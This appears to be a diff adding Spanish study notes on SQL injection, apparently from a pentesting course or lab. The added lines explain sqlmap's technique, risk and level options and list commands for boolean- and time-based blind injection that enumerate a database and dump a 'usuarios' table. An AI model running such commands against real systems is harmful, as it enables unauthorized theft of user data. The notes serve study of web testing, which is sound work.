@@ -47,9 +47,47 @@ settings --> Redirections (always)
 ---
 ### TIME
 Tiempo de carga (¿Cuanto demora en carga una página web?)
+
+
 ### OOB
 Si se puede lelvar la info fuera del servidor
 ## 
+
+### SQLMAP
+--technique=BTU
+
+--risk=
+
+1: Payload a nivel de select y uniones
+
+2: Payload de tiempo. Por ejemplo SLEEP.
+
+3: Payload basados en BOOLEAN en OR
+
+--level=
+
+1: inyecciones en metodos GET/POST
+
+2: inyecciones en las cookies
+
+3: inyecciones en los headers: user-agent, referer
+
+4: inyecciones todos los headers
+
+5: inyecciones en todos los parametros sin excepción
+
+### Boolean
+
+- sqlmap -r request_boolean.txt -p user --technique=B --risk=3 --level=3 --current-db --dbms=mysql
+
+- sqlmap -r request_boolean.txt -p user --technique=B --risk=3 --level=3 -D privacidadDB --tables --dbms=mysql
+
+- sqlmap -r request_boolean.txt -p user --technique=B --risk=3 --level=3 -D privacidadDB -T usuarios --dump --dbms=mysql
+
+### Time
+
+- sqlmap -r request_time.txt -p descripción --technique=T --risk=3 --level=3 --current-db --dbms=mysql --flush-session
+
 
 ## Estratégia
 1. Iniciar por el CMS MAGENTO
